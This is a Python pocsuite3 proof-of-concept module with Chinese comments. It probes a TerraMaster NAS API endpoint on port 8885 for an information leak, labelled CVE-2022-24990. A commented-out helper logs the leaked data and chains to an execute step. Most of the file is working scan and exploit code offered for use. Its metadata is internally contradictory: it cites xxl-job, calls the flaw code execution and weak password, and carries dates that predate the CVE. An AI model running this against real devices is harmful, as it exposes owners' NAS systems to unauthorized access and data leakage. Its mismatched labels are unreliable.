from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import json
# 关于类的继承
class CannalPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "002"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "wszxx"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "CVE-2022-24990"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "CVE-2022-24990"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """2022-30525代码执行。"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    # def poc_getinfo(target):
    #     print("[+]正则检测：{}".format(target))
    #     headers = {"User-Agent": "TNAS"}
    #     payload = target + "/module/api.php?mobile/webNasIPS"
    #     try:
    #         req = requests.get(url=payload, headers=headers).content.decode("utf-8")
    #         if "successful" in req:
    #             print("[+]存在信息泄露漏洞：{}".format(payload))
    #             print('    [-]泄露信息：' + req)
    #             with open("poc1_vul.txt", "a+", encoding="utf-8") as f:
    #                 f.write(payload + '\n')
    #             poc_execute(req, target)
    #     except:
    #         pass

    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "TNAS"}
        payload = self.url.strip()+ ":8885/module/api.php?mobile/webNasIPS"
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            #url = self.url.strip()  # self.url 就是你指定的-u 参数的值
            res = requests.get(url=payload, headers=headers, verify=False, timeout=9).content.decode("utf-8")
            if "successful" in res:
                result.append(self.url)
        except Exception as e:
            print("[!] Bye Bye hekcer !")

        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
                return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(CannalPOC)
